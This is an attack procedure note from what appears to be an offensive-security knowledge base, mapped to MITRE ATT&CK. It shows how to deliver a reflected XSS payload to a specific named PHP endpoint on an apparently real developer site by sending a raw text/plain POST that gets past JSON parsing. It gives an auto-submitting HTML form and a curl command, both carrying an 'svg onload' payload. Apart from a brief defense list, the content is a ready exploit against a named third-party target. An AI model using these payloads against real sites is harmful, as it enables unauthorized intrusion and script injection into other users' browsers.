---
id: proc-submit-xss-payload
tags:
  - post-submission
  - bypass-json
  - curl-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:12.993Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit Payload via POST Request

## Summary

This procedure submits the crafted XSS payload to the vulnerable endpoint using a raw text POST to bypass JSON parsing, simulating form submission for exploitation.

## Description

The FAQ form expects JSON but lacks strict parsing; using enctype='text/plain' or equivalent curl sends raw data, allowing the payload to reflect unsanitized. This targets the PHP handler at /faq-helpful.php.

## Requirements

1. Access to curl or a browser for form submission
2. Crafted payload from previous step
3. Target URL: https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php

## Defense

Defensive measures and detection strategies:

- Enforce strict Content-Type validation (application/json only)
- Rate-limit form submissions
- Parse and reject non-JSON payloads

## Objectives

1. Deliver payload without parsing errors
2. Trigger server reflection
3. Prepare for browser execution

## Instructions

### Step 1: Prepare Local Submission File

**Context**: Create an HTML file to auto-submit if avoiding curl.

Write vse.html with <form method="POST" action="https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php" enctype="text/plain"><input type="hidden" name="helpful" value='{"helpful":"false&lt;svg onload=alert(1)&gt;"}'><input type="submit"></form> and load in browser.

**Expected Output**: Form submits raw text.

### Step 2: Use Curl for Direct Submission

**Context**: Simulate the POST with curl for repeatability.

Execute [[commands/curl-post-xss-payload]]:

```bash
curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg onload=alert(1)&gt;"}'
```

> This sends the payload as raw text, echoing it back in the response.

**Expected Output**: HTTP response with reflected payload in HTML body.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xss-payload]]

## Tools Used


## Tags

- [[post-submission]]
- [[bypass-json]]
